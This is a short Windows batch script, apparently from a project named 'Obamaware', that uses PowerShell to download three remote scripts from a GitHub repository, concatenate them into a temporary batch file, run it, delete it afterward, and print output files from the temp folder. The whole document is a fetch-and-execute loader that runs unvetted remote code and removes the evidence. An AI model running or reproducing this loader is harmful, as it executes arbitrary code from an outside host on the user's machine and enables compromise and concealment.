powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n.ps1").Content -Path "./temp_scanner.bat"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n2.ps1").Content -Path "./temp_scanner.bat"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n3.ps1").Content -Path "./temp_scanner.bat"
start "" temp_scanner.bat
del  temp_scanner.bat
type %TEMP%/out2.txt
type %TEMP%/out.txt